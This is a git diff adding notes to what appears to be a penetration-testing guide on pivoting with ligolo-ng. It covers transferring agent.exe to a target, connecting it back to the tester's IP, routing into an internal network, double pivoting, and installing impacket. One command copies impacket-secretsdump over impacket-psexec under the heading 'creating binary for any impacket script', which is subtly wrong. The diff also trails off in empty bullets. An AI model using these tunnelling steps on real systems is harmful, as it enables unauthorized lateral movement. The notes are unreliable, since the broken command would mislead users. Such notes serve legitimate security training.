@@ -752,7 +752,63 @@ ip link set ligolo up
 
 ![image](https://github.com/user-attachments/assets/587f81fd-c1f4-421f-a5ec-b52255bb9507)
 
+- Transfer `agent.exe` to the target with iwr
+- To start the agent,use-:
+```cmd
+./agent.exe -connect [ip]:11601 -ignore-cert
+```
+
+- Upon executing the specified command, a Ligolo session is initiated. Subsequently, employ the ‘session’ command, opting for ‘1’ to access the active session.
+
+![image](https://github.com/user-attachments/assets/f3027a9a-dea4-49f6-9c61-85a30613137a)
+
+- `Ifconfig` reveals the existence of an internal network on `172.16.5.150/16`
+
+![image](https://github.com/user-attachments/assets/e429fca8-4207-4864-bdb0-600813f0d72d)
+
+- Single pivoting with `ligolo-ng`,To start the idea of pivoting to internal network, use the commands below to add the ip route-:
+
+```bash
+sudo ip route add 172.16.0.0/16 dev ligolo
+sudo ip route list
+```
+![image](https://github.com/user-attachments/assets/a9a7cd7d-fdd1-4cac-82d3-823e25396632)
+
+- Use `start` to create a tunnel on ligolo-ng, always start proxy with root-:
+
+![image](https://github.com/user-attachments/assets/8cbd52ac-5e3b-45ba-8d49-925291b0244e)
+
+- We can ping a host-:
+
+![image](https://github.com/user-attachments/assets/9fdcbc04-efe5-4c95-9d43-6d4165cbdcd9)
+
+![image](https://github.com/user-attachments/assets/d7b3fc1c-b057-4e0b-80be-56219d6d715d)
+
+- Double pivoting-:It involves gaining to a third network from the first one using the second one as intermidiary-:
+
+- Login with impacket, install impacket with-:
+
+```bash
+git clone https://github.com/SecureAuthCorp/impacket.git impacket
+cd impacket
+sudo apt install python3-impacket
+sudo python3 ./setup.py install
+```
+
+- Creating binary for any impacket script-:
+
+```
+sudo cp /usr/bin/impacket-secretsdump /usr/bin/impacket-psexec
+sudo chmod +x /usr/bin/impacket-psexec
+sudo chown user:user /usr/bin/impacket-psexec
+```
+
+-
+
 - 
+
+
+
 
 
 
